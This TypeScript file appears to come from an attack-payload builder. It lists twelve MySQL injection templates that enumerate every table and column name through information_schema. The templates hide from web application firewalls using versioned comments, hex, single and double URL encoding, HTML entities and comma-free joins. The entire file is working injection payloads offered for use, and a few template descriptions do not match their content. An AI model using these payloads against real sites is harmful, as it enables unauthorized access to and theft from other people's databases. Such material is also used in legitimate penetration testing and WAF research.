import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const WAF_VAR_METHOD_GROUPS = [
  'Standard & Bitwise',
  'SQL Hex Encoded',
  'URL & Double URL Hex',
  'HTML Entity Hex',
  'No-Comma & Bypass'
] as const;

export const wafVarMethodTemplates: BuilderTemplate[] = [
  // 1. Standard & Bitwise
  {
    id: 'waf-var-export-set',
    name: '/*!50000export_set*/ Variable WAF',
    group: 'Standard & Bitwise',
    tags: ['export_set', 'version-comment', 'waf'],
    description: 'export_set() loop variable accumulator protected with version comments /*!50000...*/',
    content: '(/*!50000SELECT*/+/*!50000export_set*/(5,@:=0,(/*!50000SELECT*/+count(*)FROM(information_schema.columns)WHERE@:=concat(@,0x0a,table_name,0x3a,column_name)),@,2))'
  },
  {
    id: 'waf-var-make-set',
    name: '/*!50000make_set*/ Variable WAF',
    group: 'Standard & Bitwise',
    tags: ['make_set', 'bitwise', 'version-comment'],
    description: 'Bitwise make_set() row-by-row accumulator wrapped in versioned comments',
    content: '(/*!50000SELECT*/+/*!50000make_set*/(6,@:=0x0a,(/*!50000SELECT*/+count(*)FROM(information_schema.columns)WHERE@:=concat(@,table_name,0x3a,column_name,0x0a)),@))'
  },
  {
    id: 'waf-var-subquery-comment',
    name: 'Subquery Variable with Inline Comments (/**/)',
    group: 'Standard & Bitwise',
    tags: ['subquery', 'inline-comment', 'waf'],
    description: 'Nested variable accumulator using /**/ delimiters instead of whitespace',
    content: '(SELECT/**/(@a)/**/FROM/**/(SELECT/**/(@a:=0x00),(SELECT/**/(0)/**/FROM/**/(information_schema.columns)/**/WHERE/**/(table_schema=database())/**/AND/**/(@a)/**/AND/**/(@a:=concat(@a,0x0a,table_name,0x3a,column_name))))a)'
  },
  {
    id: 'waf-var-version-comment',
    name: 'Version Comment Subquery Variable (/*!50000...*/)',
    group: 'Standard & Bitwise',
    tags: ['version-comment', 'subquery', 'bypass'],
    description: 'Nested subquery variable accumulator wrapped inside MySQL versioned comments',
    content: '(/*!50000SELECT*/(/*!50000@a*/)FROM(/*!50000SELECT*/(@a:=0x00),(@b:=0x00),(/*!50000SELECT*/(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a)AND(@a:=/*!50000concat*/(@a,0x0a,table_name,0x3a,column_name))))a)'
  },

  // 2. SQL Hex Encoded
  {
    id: 'waf-var-sql-hex-unhex',
    name: '/*!50000unhex*/(/*!50000hex*/()) Variable WAF',
    group: 'SQL Hex Encoded',
    tags: ['unhex', 'hex', 'version-comment'],
    description: 'Wraps variable output in versioned UNHEX(HEX()) to obscure plain text signatures from WAF detectors',
    content: '(/*!50000SELECT*/+/*!50000UNHEX*/(/*!50000HEX*/(@a))FROM(/*!50000SELECT*/(@a:=0x00),(/*!50000SELECT*/(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a)AND(@a:=/*!50000CONCAT*/(@a,0x0a,table_name,0x3a,column_name))))a)'
  },
  {
    id: 'waf-var-sql-hex-pure',
    name: 'Pure Hex Inlined WAF Variable (No Quotes)',
    group: 'SQL Hex Encoded',
    tags: ['hex', 'no-quotes', 'waf'],
    description: 'Pure hex literals for all delimiters and initializers without quotes or raw space characters',
    content: '(/*!50000SELECT*/(@a)FROM(/*!50000SELECT*/(@a:=0x00),(@b:=0x00),(/*!50000SELECT*/(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a)AND(@a:=/*!50000concat*/(@a,0x0a,table_name,0x3a,column_name))))a)'
  },

  // 3. URL & Double URL Hex
  {
    id: 'waf-var-url-hex-subquery',
    name: 'URL Hex Encoded WAF Variable (%xx)',
    group: 'URL & Double URL Hex',
    tags: ['url-hex', 'waf-evasion', 'percent'],
    description: 'WAF variable subquery completely encoded in URL hex to defeat WAF pattern-matching rules',
    content: '%28SELECT%28%40a%29FROM%28SELECT%28%40a%3a%3d0x00%29%2c%28SELECT%280%29FROM%28information%5fschema%2ecolumns%29WHERE%28table%5fschema%3ddatabase%28%29%29AND%28%40a%29AND%28%40a%3a%3dCONCAT%28%40a%2c0x0a%2ctable%5fname%2c0x3a%2ccolumn%5fname%29%29%29%29a%29'
  },
  {
    id: 'waf-var-double-url-hex-subquery',
    name: 'Double URL Hex Encoded WAF Variable (%25xx)',
    group: 'URL & Double URL Hex',
    tags: ['double-url', 'waf-bypass', 'reverse-proxy'],
    description: 'Double URL hex encoded WAF variable payload penetrating single-decode reverse proxy tiers',
    content: '%2528SELECT%2528%2540a%2529FROM%2528SELECT%2528%2540a%253a%253d0x00%2529%252c%2528SELECT%25280%2529FROM%2528information%255fschema%252ecolumns%2529WHERE%2528table%255fschema%253ddatabase%2528%2529%2529AND%2528%2540a%2529AND%2528%2540a%253a%253dCONCAT%2528%2540a%252c0x0a%252ctable%255fname%252c0x3a%252ccolumn%255fname%2529%2529%2529%2529a%2529'
  },
  {
    id: 'waf-var-url-hex-export-set',
    name: 'URL Hex WAF export_set() Variable',
    group: 'URL & Double URL Hex',
    tags: ['url-hex', 'export_set', 'waf'],
    description: 'URL-encoded WAF export_set() variable accumulator query',
    content: '%28SELECT%20export%5fset%285%2c%40%3a%3d0%2c%28SELECT%20count%28%2a%29%20FROM%20information%5fschema%2ecolumns%20WHERE%20%40%3a%3dconcat%28%40%2c0x0a%2ctable%5fname%2c0x3a%2ccolumn%5fname%29%29%2c%40%2c2%29%29'
  },

  // 4. HTML Entity Hex
  {
    id: 'waf-var-html-entity-hex',
    name: 'HTML Entity Hex WAF Variable (&#x..;)',
    group: 'HTML Entity Hex',
    tags: ['html-hex', 'entity', 'waf'],
    description: 'HTML Entity hex encoding (&#x..;) for bypassing WAF filters on endpoints accepting HTML / XML input',
    content: '&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x28;&#x40;&#x61;&#x29;&#x46;&#x52;&#x4f;&#x4d;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x28;&#x40;&#x61;&#x3a;&#x3d;&#x30;&#x78;&#x30;&#x30;&#x29;&#x2c;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x28;&#x30;&#x29;&#x46;&#x52;&#x4f;&#x4d;&#x28;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x29;&#x57;&#x48;&#x45;&#x52;&#x45;&#x28;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x3d;&#x64;&#x61;&#x74;&#x61;&#x62;&#x61;&#x73;&#x65;&#x28;&#x29;&#x29;&#x41;&#x4e;&#x44;&#x28;&#x40;&#x61;&#x29;&#x41;&#x4e;&#x44;&#x28;&#x40;&#x61;&#x3a;&#x3d;&#x43;&#x4f;&#x4e;&#x43;&#x41;&#x54;&#x28;&#x40;&#x61;&#x2c;&#x30;&#x78;&#x30;&#x61;&#x2c;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x2c;&#x30;&#x78;&#x33;&#x61;&#x2c;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x29;&#x29;&#x29;&#x29;&#x61;&#x29;'
  },

  // 5. No-Comma & Bypass
  {
    id: 'waf-var-no-comma-join',
    name: 'No-Comma JOIN WAF Variable Initializer',
    group: 'No-Comma & Bypass',
    tags: ['no-comma', 'join', 'waf-bypass'],
    description: 'WAF variable accumulator using JOIN expressions without any comma characters',
    content: '(/*!50000SELECT*/(@a)FROM(/*!50000SELECT*/(1))x JOIN(/*!50000SELECT*/(@a:=0x00))y JOIN(/*!50000SELECT*/(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a:=/*!50000concat*/(@a,0x0a,table_name,0x3a,column_name)))z)'
  },
  {
    id: 'waf-var-bitwise-pipe',
    name: 'Bitwise OR Pipe WAF Variable (/*!50000concat*/(...) | 0)',
    group: 'No-Comma & Bypass',
    tags: ['bitwise', 'pipe', 'waf'],
    description: 'WAF bypass variable evaluation using pipe OR operator | 0 instead of standard parentheses',
    content: '(/*!50000SELECT*/(@a)FROM(/*!50000SELECT*/(@a:=0x00),(/*!50000SELECT*/(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a:=/*!50000concat*/(@a,0x0a,table_name,0x3a,column_name)|0)))a)'
  }
];

export const varMethodSubcategory: BuilderSubcategory = {
  id: 'var-method',
  label: 'Variable methods',
  description: 'WAF bypass variable-based data extraction templates (Bitwise, Comments, SQL/URL/HTML Hex encoded)',
  templates: wafVarMethodTemplates
};
